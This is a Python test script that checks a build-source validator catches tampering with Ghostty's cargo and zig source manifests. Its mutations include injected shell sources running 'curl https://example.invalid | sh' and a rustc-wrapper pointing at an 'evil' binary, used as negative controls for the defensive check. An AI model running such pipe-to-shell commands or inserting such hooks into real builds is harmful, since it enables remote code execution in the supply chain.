#!/usr/bin/env python3
"""Controls for check-sources.py: each hand edit below must be caught.

Starts from the committed files, which must pass, then applies one mutation
at a time to a copy and requires at least one error. The mutations are the
ones a review of PR #21 showed the first version of the check let through,
plus the basic ones it already caught. CI runs this in the `sources` job.
"""

from __future__ import annotations

import copy
import importlib.util
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("check_sources", HERE / "check-sources.py")
assert spec is not None and spec.loader is not None
check_sources = importlib.util.module_from_spec(spec)
spec.loader.exec_module(check_sources)
pins = check_sources.pins


def zig_archives(ghostty: list) -> list[dict]:
    prefix = pins.ZIG_PACKAGES_DEST + "/"
    return [s for s in ghostty if s["type"] == "archive" and s["dest"].startswith(prefix)]


def swap_zig_url_and_sha(cargo: list, ghostty: list) -> None:
    a, b = zig_archives(ghostty)[:2]
    a["url"], b["url"] = b["url"], a["url"]
    a["sha256"], b["sha256"] = b["sha256"], a["sha256"]


def shell_source_in_cargo(cargo: list, ghostty: list) -> None:
    cargo.append({"type": "shell", "commands": ["curl https://example.invalid | sh"]})


def shell_source_in_ghostty(cargo: list, ghostty: list) -> None:
    ghostty.append({"type": "shell", "commands": ["curl https://example.invalid | sh"]})


def rustc_wrapper_in_cargo_config(cargo: list, ghostty: list) -> None:
    config = next(s for s in cargo if s.get("dest-filename") == "config")
    config["contents"] += '\n[build]\nrustc-wrapper = "/run/build/halyard/evil"\n'


def crate_checksum_changed(cargo: list, ghostty: list) -> None:
    crate = next(s for s in cargo if s["type"] == "archive")
    crate["sha256"] = "0" * 64


def crate_url_changed(cargo: list, ghostty: list) -> None:
    crate = next(s for s in cargo if s["type"] == "archive")
    crate["url"] = crate["url"].replace("static.crates.io", "crates.example.invalid")


def ghostty_commit_changed(cargo: list, ghostty: list) -> None:
    src = next(s for s in ghostty if s["dest"] == pins.GHOSTTY_DEST)
    src["commit"] = "1" * 40


def zig_git_commit_changed(cargo: list, ghostty: list) -> None:
    src = next(s for s in ghostty if s["type"] == "git" and s["dest"] != pins.GHOSTTY_DEST)
    src["commit"] = "2" * 40


def extra_field_on_archive(cargo: list, ghostty: list) -> None:
    zig_archives(ghostty)[0]["commands"] = ["true"]


def zig_package_dropped(cargo: list, ghostty: list) -> None:
    ghostty.remove(zig_archives(ghostty)[0])


MUTATIONS = [
    swap_zig_url_and_sha,
    shell_source_in_cargo,
    shell_source_in_ghostty,
    rustc_wrapper_in_cargo_config,
    crate_checksum_changed,
    crate_url_changed,
    ghostty_commit_changed,
    zig_git_commit_changed,
    extra_field_on_archive,
    zig_package_dropped,
]


def main() -> int:
    cargo = json.loads(pins.CARGO_SOURCES.read_text())
    ghostty = json.loads(pins.GHOSTTY_SOURCES.read_text())
    manifest = check_sources.MANIFEST.read_text()
    auth = check_sources.authorities()

    clean = check_sources.check_all(cargo, ghostty, manifest, auth)
    if clean:
        print("FAIL: the committed files do not pass:", *clean, sep="\n  ")
        return 1
    print("ok: committed files pass")

    failed = 0
    for mutate in MUTATIONS:
        c, g = copy.deepcopy(cargo), copy.deepcopy(ghostty)
        mutate(c, g)
        errors = check_sources.check_all(c, g, manifest, auth)
        if errors:
            print(f"ok: {mutate.__name__} caught: {errors[0]}")
        else:
            print(f"FAIL: {mutate.__name__} was not caught")
            failed += 1
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
